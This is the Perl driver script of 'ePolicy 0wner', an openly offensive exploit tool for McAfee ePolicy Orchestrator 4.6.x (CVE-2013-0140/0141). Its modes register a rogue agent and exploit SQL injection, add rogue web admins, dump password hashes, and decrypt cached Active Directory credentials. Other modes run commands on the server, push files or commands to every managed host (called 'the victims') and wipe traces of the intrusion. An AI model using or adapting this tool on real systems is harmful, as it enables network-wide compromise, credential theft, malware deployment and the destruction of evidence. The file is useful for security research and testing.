#!/usr/bin/perl 
#=====================================================================================================
#**                                   ~= ePolicy 0wner v0.2 =~                                      **
#**                                                                                                 **
#**            McAfee ePolicy Orchestrator (version 4.6.0 -> 4.6.5)  -  A sexy exploit              **
#**                                                                                                 **
#**                 Author:  jerome.nokin@gmail.com                                                 **
#**                   Blog:  http://funoverip.net                                                   **
#**                    CVE:  CVE-2013-0140 + CVE-2013-0141                                          **
#**          Discovered on:  20 November 2012                                                       **
#**               Fixed on:  25 April 2013                                                          **
#**                                                                                                 **
#=====================================================================================================

use strict;
use warnings;

use lib 'lib/';
use Getopt::Long;
use Socket;
use Term::ANSIColor;
use Epowner::Epo ':constants';	# ePolicy Owner module


# Our main epo object
my $epo = Epowner::Epo->new;



#====================================================================
# Print Banner
#====================================================================
sub print_banner {
	print << 'EOF';
***********************************************************************************
**                         ~= ePolicy 0wner v0.2 =~                              **
**                                                                               **
** McAfee ePolicy Orchestrator (version 4.6.0 -> 4.6.5)  -  A sexy exploit       **
**                                                                               **
**        Author:  jerome.nokin@gmail.com                                        **
**          Blog:  http://funoverip.net                                          **
**           CVE:  CVE-2013-0140 + CVE-2013-0141                                 **
** Discovered on:  20 November 2012                                              **
**      Fixed on:  25 April 2013                                                 **
**                                                                               **
***********************************************************************************
EOF
}


sub save_exit {
	$epo->config_save();	
	exit;
}


#====================================================================
# Read exploit arguments
#====================================================================

if(!defined($ARGV[0])){
        print_banner();
        print_short_help();
        exit;
}

my $option_test = 0;

my $option_force_nondba = 0;

my $option_clean= 0;
my $option_wipe = 0;
my $option_clean_cmd_history = 0;

my $option_register     = 0;
my $option_unregister     = 0;
my $option_check        = 0;

my $option_addadmin     = 0;
my $option_user         = 0;
my $option_pass         = 0;

my $option_domain_creds =0;

my $option_readdb	= 0;
my $option_hash		= 0;
my $option_agents	= 0;

my $option_install_path	= 0;

my $option_client_deploy= 0;
my $option_custom	=0;
my $option_file		= 0;
my $option_file_args	= 0;
my $option_targets	= 0;
my $option_force        = 0;

my $option_server_upload = 0;
my $option_src_file      = 0;
my $option_dst_file      = 0;


my $option_setup_nondba	= 0;
my $option_clean_nondba	= 0;
my $option_server_exec = 0;
my $option_wizard 	= 0;
my $option_cmd          = 0;


my $option_short_help   = 0;
my $option_verbose      = 0;
my $option_nocolor      = 0;
my $option_configfile	= "epo.conf";
my $option_server_host  = 0;
my $option_server_port  = 443;
my $option_server_console_port  = 8443;
my $option_agent_hostname  = 0;
my $option_agent_ip     = 0;

my $option_sql 		= 0;
my $option_sql_select 	= 0;
my $option_sql_generic 	= 0;

my $option_path_srpubkey  = 0;
my $option_path_reqseckey = 0;
my $option_path_framepkg  = 0;


my $get_options_result= GetOptions (   
		"test" 			=> \$option_test, 
		"cli-deploy|d"		=> \$option_client_deploy,
		"targets|t=s"		=> \$option_targets,
		"file|f=s"		=> \$option_file,
		"file-args=s"		=> \$option_file_args,
		"custom=s"		=> \$option_custom,

		"force-nondba"		=> \$option_force_nondba,
		"setup-nondba"		=> \$option_setup_nondba,
		"clean-nondba"		=> \$option_clean_nondba,

		"get-install-path"	=> \$option_install_path,
		"force"			=> \$option_force,

		"srv-upload"		=> \$option_server_upload,
		"src-file=s"		=> \$option_src_file,
		"dst-file=s"		=> \$option_dst_file,
		
		"clean"			=> \$option_clean,
		"wipe"			=> \$option_wipe,
		"clean-cmd-history"	=> \$option_clean_cmd_history,

		"register|r"            => \$option_register,
		"unregister|u"          => \$option_unregister,
                "check"			=> \$option_check,
               
		"add-admin"		=> \$option_addadmin,
		"user=s"		=> \$option_user,
		"pass=s"		=> \$option_pass,

                "readdb"		=> \$option_readdb,
                "hash"			=> \$option_hash,
                "agents"		=> \$option_agents,

		"ad-creds"		=> \$option_domain_creds,
		"srv-exec"		=> \$option_server_exec,
		"wizard"		=> \$option_wizard,
		"cmd=s"			=> \$option_cmd,
		"help|h"		=> \$option_short_help,
		"verbose|v"		=> \$option_verbose,
		"no-color"		=> \$option_nocolor,
                "config=s"              => \$option_configfile,
                "server-host|sh=s"      => \$option_server_host,
                "server-port|sp=i"      => \$option_server_port,
                "server-console-port=i"      => \$option_server_console_port,
                "agent-hostname|ah=s"   => \$option_agent_hostname,
                "agent-ip|ai=s"         => \$option_agent_ip,
		
		"sql"   		=> \$option_sql,
		"select=s" 		=> \$option_sql_select,
		"generic=s" 		=> \$option_sql_generic,

		# github issue-1 workaround
		"srpubkey=s" 		=> \$option_path_srpubkey,
		"reqseckey=s"		=> \$option_path_reqseckey,
		"framepkg=s" 		=> \$option_path_framepkg,

);


if(not $get_options_result){
	print "Please review '$0 -h'\n";
	exit;
}


if($option_short_help){
	print_banner();
	print_short_help();
	exit;
}



# No color ?
if($option_nocolor){
	$epo->set_no_color();
}

# Force something ?
if($option_force){
        $epo->set_force();
}


#==========================
# Only one mode at a time
#==========================
my $sum =  	$option_register +
		$option_unregister + 
		$option_check + 
		$option_addadmin + 
		$option_server_exec + 
		$option_readdb + 
		$option_client_deploy +
		$option_server_upload +
		$option_install_path +
		$option_wipe +
		$option_domain_creds +
		$option_sql;
if($sum eq 0){
        $epo->print_err( "[-] ERROR: No mode has been chosen\n");
        exit;
}elsif($sum gt 1){
        $epo->print_err("[-] ERROR: Only one mode can be used at a time\n");
        exit;
}


# set config filename and verbose
$epo->set_config_file($option_configfile);
$epo->set_verbose_mode($option_verbose);
$epo->set_server_console_port($option_server_console_port);

# BANNER and MODE
#===================
print_banner();
if($option_register) 		{ $epo->print_info("[*] MODE: NEW AGENT REGISTRATION\n\n"); }
if($option_unregister) 		{ $epo->print_info("[*] MODE: UNREGISTER\n\n"); }
if($option_check)    		{ $epo->print_info("[*] MODE: VULNERABILITY CHECK\n\n"); }
if($option_addadmin) 		{ $epo->print_info("[*] MODE: ADD ADMIN INTO DATABASE\n\n"); }
if($option_server_exec) 	{ $epo->print_info("[*] MODE: SERVER - CMD EXEC\n\n"); }
if($option_server_upload) 	{ $epo->print_info("[*] MODE: SERVER - FILE UPLOAD\n\n"); }
if($option_readdb)		{ $epo->print_info("[*] MODE: READ DATABASE\n\n"); }
if($option_domain_creds)	{ $epo->print_info("[*] MODE: GET ACTIVE DIRECTORY CREDENTIALS\n\n"); }
if($option_wipe)		{ $epo->print_info("[*] MODE: WIPE\n\n"); }
if($option_install_path)	{ $epo->print_info("[*] MODE: GET INSTALLATION PATH\n\n"); }
if($option_client_deploy)	{ $epo->print_info("[*] MODE: PRODUCTS/COMMANDS DEPLOYMENT ON CLIENT(S)\n\n"); }
if($option_sql)                 { $epo->print_info("[*] MODE: EXECUTE CUSTOM SQL QUERY\n\n");}


#=====================
# Non-REGISTER modes
#=====================
if($option_register eq 0){
        if(     $option_server_host ne 0 or
                $option_server_port ne 443 or
                $option_agent_hostname ne 0 or
                $option_agent_ip ne 0 ){
                $epo->print_err("[-] ERROR: --server-host, --server-port, --agent-hostname and --agent-ip can only be used in conjunction with --register\n");
                exit;
        }
        # read config file
        $epo->config_restore();
}


#====================================================================
# REGISTER MODE
#====================================================================
if($option_register){

        # if config file found
        if(-e $option_configfile){
                $epo->print_err("[-] ERROR: A previous configuration file was found ($option_configfile) while you are using '--register' parameter.\n");
                $epo->print_err("    Please remove it if you want to register a new agent to the ePo server or use --config <file>\n");
                exit;
        }

        # SERVER HOST/PORT
        if($option_server_host eq 0){
                $epo->print_err( "[-] ERROR: Parameter \"--server-host\" can't be empty when \"--register\" is in use\n");
                exit;
        }
        $epo->set_server_host($option_server_host);
        $epo->set_server_port($option_server_port);


	# Check connectivity
	my $epo_host_string =  $epo->get_server_host() . ":" .$epo->get_server_port() ;
	print "[*] Target: $epo_host_string. Testing connection ... ";;
	if(not $epo->check_connectivity()){
	        $epo->print_err("[-] ERROR: Could not connect to $epo_host_string\n");
        	exit;
	}
	print "succeeded\n";



        # AGENT HOSTNAME
        print "[*] Generating Agent Identify\n";
        if($option_agent_hostname eq 0){
                # Generating hostname
                my @chars=('0'..'9', 'a'..'z', 'A'..'Z');
                $option_agent_hostname = "";
                foreach (1..8)  { $option_agent_hostname.=$chars[rand @chars]; }
	}
        $epo->set_agent_hostname($option_agent_hostname);

        # AGENT IP
        if($option_agent_ip eq 0){
                # Generating IP, subnet, netmask
                my $ip = int rand(2**32);
                $option_agent_ip = inet_ntoa(pack('N',$ip));
        }
        $epo->set_agent_ip($option_agent_ip);

        # AGENT MAC ADDR
        my @c=('0'..'9', 'a'..'f');
        my $mac  = '01' . $c[rand @c].$c[rand @c] . $c[rand @c].$c[rand @c] .
                $c[rand @c].$c[rand @c] . $c[rand @c].$c[rand @c] . $c[rand @c].$c[rand @c];
        $epo->set_agent_mac($mac);


        # AGENT GUID
        $epo->generate_agent_guid();

	
	# Generate some random stuffs
	$epo->init_prefix();
	$epo->init_productid();

	# Locql Keys provided ?
	if($option_path_srpubkey){
		$epo->set_path_srpubkey_bin ($option_path_srpubkey);
	}
        if($option_path_reqseckey){
                $epo->set_path_reqseckey_bin ($option_path_reqseckey);
        }
        if($option_path_framepkg){
                $epo->set_path_framepkg_exe ($option_path_framepkg);
        }


	# send request
	my $http_request = $epo->mode_register_generate_request();

	if($epo->send_http_request($http_request)){
		$epo->print_ok("[*] Agent successfuly registered (HTTP/1.1 200 OK) !\n");	
		$epo->set_registered();
	}else{		
                $epo->print_err("[-] ERROR: Did not receive HTTP code 200. Something went wrong :( ... \n");
                $epo->print_err("    Ask the ePo admin to check the logs ? :-)\n");
                exit;
	}

	$epo->config_save();

	# test if we can trigger the vulnerability
	# and if we have DBA privs
	$epo->print_info("\n[*] MODE: CHECK (auto starting)\n"); 
	$epo->mode_check();
}



#====================================================================
# MANUAL SQL QUERY
#====================================================================
if($option_sql){
        if($option_sql_select eq 0 and $option_sql_generic eq 0){
                $epo->print_err("[-] ERROR: sub option is missing. Please use '--select' or '--generic'\n");
                exit;
        }
	if($option_sql_select ne 0 and $option_sql_generic ne 0 ){
		$epo->print_err("[-] ERROR: Only one sub option can be used with '--sql' mode.\n");
		exit;
	}

	# select-like
	if($option_sql_select){
		$epo->mode_sql_query_with_results($option_sql_select);
        }else{
		$epo->mode_sql_query_without_results($option_sql_generic);
	}
	save_exit();
}


#====================================================================
# GET INSTALL PATH
#====================================================================
if($option_unregister){
        $epo->mode_unregister();
        save_exit();
}


#====================================================================
# FORCE NON-DBA
#====================================================================
if($option_force_nondba){
        $epo->set_force_nondba();
}



#====================================================================
# GET INSTALL PATH
#====================================================================
if($option_install_path){
	$epo->mode_gatherinfo_installation_path();
	save_exit();
}


#====================================================================
# ADD ADMIN MODE
#====================================================================
if($option_addadmin){

	if($option_clean){
		$epo->mode_addadmin_clean();
		save_exit();
	}

	if($option_user){
	        $epo->mode_addadmin($option_user, $option_pass);
	}else{
		$epo->mode_addadmin(); # default user/pass
	}
	save_exit();

}


#====================================================================
# UPLOAD SERVER
#====================================================================
if($option_server_upload){

        if($option_src_file eq 0){
                $epo->print_err("[-] ERROR: --src-file </path/to/filename> is missing\n");
                exit;
        }
        if($option_dst_file eq 0){
                $epo->print_err("[-] ERROR: --dst-file <filename> is missing\n");
                exit;
        }

        $epo->mode_server_upload_from_file($option_src_file, $option_dst_file);

        save_exit();

}


#====================================================================
# CMD EXEC SERVER MODE
#====================================================================
if($option_server_exec){


	if($option_wizard){

		$epo->mode_server_exec_wizard();
		save_exit();
	}


	if($option_setup_nondba){
	        #if ($epo->have_dba_privs() and not $epo->get_force_nondba()){
	        if ($epo->get_srv_exec_mode() == 1 and not $epo->get_force_nondba()){
	                $epo->print_warn("[-] You have DBA privs. You don't need this ... Skipping user request.\n");
			$epo->print_warn("    You may use '--force-nondba' if you really want to perform this action\n");
        	}else{
			if($epo->mode_server_exec_notdba_setup()){
	                	$epo->print_ok("[*] It smells good\n");
	        	        print "[*] You may now use '--srv-exec' and '--cmd' parameters to send command\n";
	                	print "    EXAMPLE: $0 --srv-exec --cmd \"ping -n 20 192.168.0.1\"\n";
		                print "    NOTE:    your command will be prefixed by 'cmd.exe /c'\n";
        		}else{
				$epo->print_err("[-] ERROR: --setup-nondba failure\n");
			}
		}
	
		save_exit();

	}


	if($option_clean_nondba){
                #if ($epo->have_dba_privs() and not $epo->get_force_nondba()){
                if ($epo->get_srv_exec_mode() == 1 and not $epo->get_force_nondba()){
                        $epo->print_warn("[-] You have DBA privs. You don't need this ... Skipping user request.\n");
			$epo->print_warn("    You may use '--force-nondba' if you really want to perform this action\n");
                }else{
                        if($epo->mode_server_exec_notdba_clean()){
                                $epo->print_ok("[*] It smells good\n");
                        }else{
                                $epo->print_err("[-] ERROR: --clean-nondba failure\n");
                        }
                }
		save_exit();
	}



        if($option_clean_cmd_history){
                #if ($epo->have_dba_privs() and not $epo->get_force_nondba()){
                if ($epo->get_srv_exec_mode() == 1 and not $epo->get_force_nondba()){
                        $epo->print_warn("[-] You have DBA privs. You don't need this ... Skipping user request.\n");
                        $epo->print_warn("    You may use '--force-nondba' if you really want to perform this action\n");
                }else{
                        if($epo->mode_wipe_nondba_cmd_history()){
                                $epo->print_ok("[*] It smells good\n");
                        }else{
                                $epo->print_err("[-] ERROR: --clean-cmd-history failure\n");
                        }
                }
                save_exit();
        }


        if($option_cmd eq 0){
                $epo->print_err("[-] ERROR: --cmd <command> is missing\n");
                exit;
        }

	$epo->mode_server_exec_send($option_cmd);

	save_exit();

}





#====================================================================
# DEPLOY SOFT
#====================================================================
if($option_domain_creds){

	$epo->mode_domain_credentials();
	save_exit();
}

#====================================================================
# DEPLOY SOFT
#====================================================================
if($option_client_deploy){

        if($option_targets eq 0){
                $epo->print_err("[-] ERROR: --targets <...> is missing\n");
                exit;
        }

	my $option_test=0;
	if($option_file ne 0) 	{ $option_test++; }
	if($option_cmd ne 0) 	{ $option_test++; }
	if($option_custom ne 0) { $option_test++; }
	if ($option_test != 1){
                $epo->print_err("[-] ERROR: What should I deploy for you ? Please choose between :\n");
		$epo->print_err("     --cli-deploy --file </path/to/file> [--file-args <parameters>]\n");
		$epo->print_err("     --cli-deploy --cmd <os command>\n");
		$epo->print_err("     --cli-deploy --custom <path/to/custom/folder>\n");
                exit;
        }

	# quick check on targets
	my @targets = split(/,/, $option_targets);
	my $count = @targets;
	if($count == 0){
		$epo->print_err("[-] ERROR: no targets where provided\n");
		$epo->print_err("[-]        Syntax is: --targets __ALL__\n");
		$epo->print_err("[-]               or: --targets host1,host2,host3[,hostN]\n");
		$epo->print_err("[-]        Use '--readdb --agents' to get the host list\n");
		exit;
	}

	if($option_file){
		$epo->mode_client_deploy(DEPLOY_FILE, $option_file, $option_targets, $option_file_args);
	}elsif($option_cmd){
		$epo->mode_client_deploy(DEPLOY_CMD,  $option_cmd,  $option_targets);
	}else{
		$epo->mode_client_deploy(DEPLOY_CUSTOM,  $option_custom,  $option_targets);
	}

	save_exit();

}



#====================================================================
# READ DB
#====================================================================
if($option_readdb){


	if($option_hash eq 0 and $option_agents eq 0){
		$epo->print_err("[-] ERROR: sub option is missing. Please use '--hash', '--agents' or both\n");
		exit;
	}

	if($option_hash){
		$epo->mode_readdb_print_users();
	}
	
	
	if($option_agents){
        	$epo->mode_readdb_print_agents();
        }


	save_exit();
}



#====================================================================
# CHECK MODE
#====================================================================
if($option_check){

	# this mode automatically start after "--register" to detemine if we have DBA privs.	
	$epo->mode_check();
	save_exit();
}


#====================================================================
# CLEAN LOGS, FILES, ...
#====================================================================
if($option_wipe){
        $epo->mode_wipe();
        save_exit();
}


#====================================================================
# Print Short Help
#====================================================================
sub print_short_help {

        print << "EOF";

HINT: See README file for more details and example usages !

Usage: $0 <MODE> [OPTIONS...]


============================
= COMMON OPTIONS           =
============================

  -v, --verbose                    Be verbose ...  
  -c, --config <filename>          An alternative configuration file to store agent data (default: epo.conf).
  --no-color                       Disable colored output


============================
= MODE: --register         =
============================

Description: Register a new agent on the ePo server

Synopsis

   $0 --register --server-host <ip> [--server-port <port>] [--agent-hostname <host>] [--agent-ip <ip>]

Parameters 

   --sh, --server-host <ip>        The hostname or IP address of the ePo server (MANDATORY)
   --sp, --server-port <port>      The SSL port used for Agent-Server communication (default: 443)
   --ah, --agent-hostname <host>   The hostname of the new agent (default: random)
   --ai, --agent-ip <ip>           The IP address of the new agent (default: random)


============================
= MODE: --unregister       =
============================

Description: Unregister your agent on the ePo server

Synopsis

   $0 --unregister


============================
= MODE: --add-admin        =
============================

Description: Add a new web admin account into the DB

Synopsis

   $0 --add-admin [--user <username>] [--pass <password>]
   $0 --add-admin --clean 

Parameters

   --user <username>               The desired username (default: random)
   --pass <password>               The desired password (default: random)
   --clean                         Remove our admin account from the database


============================
= MODE: --readdb           =
============================

Description: Retrieve various information from the database

Synopsis

   $0 --readdb [--hash] [--agents]

Parameters

   --hash                          Get useraccounts and password hashes
   --agents                        Get managed stations list


============================
= MODE: --srv-exec         =
============================

Description: Remote Command Execution on ePo server

Synopsis

   $0 --srv-exec --wizard
   $0 --srv-exec --cmd <command> [--force-nondba]
   $0 --srv-exec --setup-nondba [--force-nondba]
   $0 --srv-exec --clean-nondba [--force-nondba]
   $0 --srv-exec --clean-cmd-history [--force-nondba]

Parameters

   --wizard                        USE ME FIRST. Let me configure this for you!
   --cmd <command>                 The Windows command to execute. 
   --setup-nondba                  If no DBA privs, use this before --cmd
   --clean-nondba                  Uninstall --setup-nondba
   --force-nondba                  Force non DBA cmdexec mode
   --clean-cmd-history             NonDBA mode only: This parameter clean up our "events", 
                                   and so the list of commands we already executed on the ePo server

============================
= MODE: --srv-upload       =
============================

Description: Upload files on the ePo server

Synopsis

   $0 --srv-upload --src-file </path/to/file> --dst-file <filename>

Parameters

   --src-file </path/to/file>      Local file you'd like to upload (MANDATORY)
   --dst-file <filename>           The destination filename (MANDATORY)
                                   The file will be stored under the ePo installation folder.

============================
= MODE: --cli-deploy       =
============================

Description: Deploy commands OR softwares on managed stations
             Note: Deploy means "Upload + Exec"

Synopsis

   $0 --cli-deploy --targets <...> --cmd <command>
   $0 --cli-deploy --targets <...> --file </path/to/file> [--file-args "arguments"] 

Parameters

   --targets <...>                 The victims. Valid values are :
                                     --targets __ALL__ (for all stations)
                                     --targets host1,host2,host3
   --file </path/to/file>          The software you'd like to upload/exec on the victim(s). 
   --file-args <args>              Optional arguments you'd like to pass to your software
   --cmd <command>                 The Windows command to execute.


============================
= MODE: --check            =
============================

Description: Check the SQL Injection vunerability
 
Synopsis

   $0 --check


============================
= MODE: --ad-creds         =
============================

Description: Retrieve and decrypt cached domain credentials from ePo database

Synopsis

   $0 --ad-creds


============================
= MODE: --get-install-path =
============================

Description: Retrieve the installation pathes of ePo software

Synopsis

   $0 --get-install-path


============================
= MODE: --sql              =
============================

Description: Execute your own SQL queries on the ePO database

Synopsis:

   $0 --sql --select <statement>
   $0 --sql --generic <statement>

Parameters:

  --select <arg>        SELECT-like statement with output from the database.
  --generic <arg>       Any other SQL statements without output (ex: INSERT, UPDATE, ...)


============================
= MODE: --wipe             =
============================

Description: Wipe our traces from the database & filesystem.
             The cleaning process is also replicated on all AgentHandlers
             The only remaining thing will be your "agents" (so you can still use it).

Synopsis

   $0 --wipe

===========================================================
HINT: See README file for more details and example usages !
===========================================================
EOF
}

save_exit;
